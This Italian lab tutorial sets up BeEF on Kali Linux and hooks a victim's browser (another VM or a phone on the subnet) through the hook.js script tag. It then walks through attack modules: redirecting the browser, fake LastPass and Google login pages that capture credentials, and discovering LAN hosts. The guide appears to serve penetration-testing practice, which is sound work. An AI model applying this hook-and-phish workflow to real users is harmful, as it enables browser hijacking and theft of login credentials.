Macchina Attaccante -> Kali Linux  
Macchina Vittima -> Ubuntu/ altro browser su Kali / cellulare / ... / qualsiasi dispositivo nella sottorete  
1 - Su Kali lancia questi comandi per scaricare BeEF (Browser Exploitation Framework)
```bash
sudo apt update
sudo apt install -y beef-xss
```
Avvia l'app (se non hai modificato le credenziali di default ti chiederà di cambiare la password
```bash
└─$ sudo beef-xss
[-] You are using the Default credentials
[-] (Password must be different from "beef")
[-] Please type a new password for the beef user: 
[i] GeoIP database is missing
[i] Run geoipupdate to download / update Maxmind GeoIP database
[*] Please wait for the BeEF service to start.
[*]
[*] You might need to refresh your browser once it opens.
[*]
[*]  Web UI: http://127.0.0.1:3000/ui/panel
[*]    Hook: <script src="http://<IP>:3000/hook.js"></script>
[*] Example: <script src="http://127.0.0.1:3000/hook.js"></script>

● beef-xss.service - beef-xss
     Loaded: loaded (/usr/lib/systemd/system/beef-xss.service; disabled; preset: disabled)
     Active: active (running) since Tue 2025-11-11 12:56:28 CET; 5s ago
 Invocation: 9a26bad3ed704b8794420f86bccfc01a
   Main PID: 5066 (ruby)
      Tasks: 10 (limit: 2197)
     Memory: 137.7M (peak: 141.2M)
        CPU: 4.232s
     CGroup: /system.slice/beef-xss.service
             ├─5066 ruby ./beef
             └─5119 node /tmp/execjs20251111-5066-dz5nc5js

```
Ti aprirà una schermata di login di browser al link "http://127.0.0.1:3000/ui/authentication"
Effettua il login con le credenziali 
2 - dal browser della vittima
Se usi lo stesso computer apri un altro Browser ad esempio Cromium già installato
```bash
http://127.0.0.1:3000/demos/butcher/index.html
```
o se stai usando due macchine virtuali diverse 
```bash
http://<IP MACCHINA KALI>:3000/demos/butcher/index.html
```
o se vuoi attaccare un cellulare (ad esempio un iphone) o un qualsiasi dispositivo nella tua sottorete  
imposta la macchina Kali in Bridge (potresti dove accedere dal cellulare usando il browser Firefox)
```bash
http://<IP MACCHINA KALI BRIDGE>:3000/demos/butcher/index.html
```
Si aprirà un sito di carne
3 - Dalla schermata del browser di kali clicca nella colonna di sinistra l'indirizzo ip 
Si aprirà una schermata contenente i dettagli della sessione interessata dalla vittima
Vai nella voce "Commands" dove sono presenti tutti gli attacchi possibili
Ogni modulo di comando ha un'icona a forma di semaforo, che viene utilizzata per indicare quanto segue:
🟢 Il modulo di comando funziona con il target e dovrebbe essere invisibile all'utente
🟠 Il modulo di comando funziona con il target, ma potrebbe essere visibile all'utente
⚪ Il modulo di comando deve ancora essere verificato con questo target
🔴 Il modulo di comando non funziona con questo target

Alcuni attacchi possibili:
**-Redirect Browser**  
Nella Scheda Commands accedi alla cartella Browser/Hooked Domain e seleziona la voce "Redirect Browser" ad esempio (Standard).
Inserisci il link che si vuole reindirizzare la rete della vittima e seleziona Execute
Nella schermata della vittima sarà avvenuto l'inidirizzamento alla nuova pagina

**-Alert Dialog**  
Nella Scheda Command/Browser/Hooked Domain vai alla voce "Create Alert Dialog" e seleziona Execute
Questa voce ti permette di far uscire una finestra di Alert nella schermata della vittima.

**-Sniffing Credenziali con LastPass (Funziona con Chrome)**  
Nella Scheda Command/Social Engineering vai alla voce "Fake LastPass" e poi seleziona Execute.
Questa voce aprirà nella schermata della vittima una Fake pagina di login di LastPass.
Le credenziali registrate saranno visibili nella colonna "Module Results History". 
Seleziona la voce interessata e ti uscirà tutte le lettere digitate dall'utente in ordine di digitazione come se fosse un Keylogger.

**-Sniffing Credenziali Google**  
Nella Scheda Command/Social Engineering vai alla voce "Google Phishing" e poi seleziona Execute.
Questa voce aprirà nella schermata della vittima una Fake pagina di login di Google.
Le credenziali registrate saranno visibili nella colonna "Module Results History". 
Seleziona la voce interessata e ti uscirà "data: result=Username: email Password: password"

**-Identificazione della LAN Subnets**  
Nella Scheda Commands/Network seleziona la voce "Get ntop Network Hosts" e premi Execute.
Questa voce interroga il servizio ntop (se presente nella rete della vittima) per ottenere l’elenco degli host rilevati nella LAN.
Nel pannello Module Results History comparirà una voce con l’output di un host con quell’IP oppure un messaggio result=scan complete.



